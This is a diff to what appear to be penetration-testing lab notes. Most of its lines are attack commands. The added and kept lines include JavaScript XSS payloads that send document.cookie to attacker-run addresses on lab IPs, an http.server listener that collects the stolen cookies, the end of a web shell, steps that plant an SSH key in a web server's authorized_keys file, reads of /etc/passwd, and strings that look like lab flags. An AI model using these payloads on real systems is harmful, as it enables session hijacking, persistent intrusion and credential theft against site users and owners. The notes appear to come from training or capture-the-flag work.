@@ -10,7 +10,7 @@ nikto -host >IP<
 SESSION COOKIE STEALING DEMO:
 python3 -m http.server (DEFAULTS TO 8000)
 ON WEB BROWSER: <script>document.location="http://10.50.20.97/Cookie_Stealer1.php?username=" + document.cookie;</script>
-<script>document.location="http://OP-Station-IP:OPS-PORT/?username=" + document.cookie;</script>
+<script>document.location="http://10.50.41.179:8000/?username="+document.cookie;</script>
 <script>window.location.href="http://website/?"+document.cookie;</script>
 <script>write.location.href="http://10.50.20.97"</script>
 ---
@@ -28,3 +28,21 @@ WEB SHELL SCRIPT:
   ?>
   </pre>
   </BODY></HTML>
+---
+SSH KEYGEN: 
+ssh-keygen -t rsa -b 4096
+cat ~/.ssh/id_rsa.pub
+echo "" > /var/www/.ssh/authorized_keys
+cat /users/home/directory/.ssh/authorized_keys
+
+cat /etc/motd
+You are accessing a system operated by the vg6BG9cAkNueQdEjbmWB, all actions are being monitored.
+
+cat /home/romanoff@mi.ru/contracts 
+EMzNDwmxboVvlyL9dK06
+cat /etc/passwd | grep billy
+billybob:x:1001:1001:you found me rQvj8BrZwUT7MA6FQFqd:/home/billybob:/bin/bash
+
+cFnglZmcQIUK6XoHGV06
+zYoQJihPWDzk383T34u3
+2vgb6r5j1f88pv1o94tjabudvr
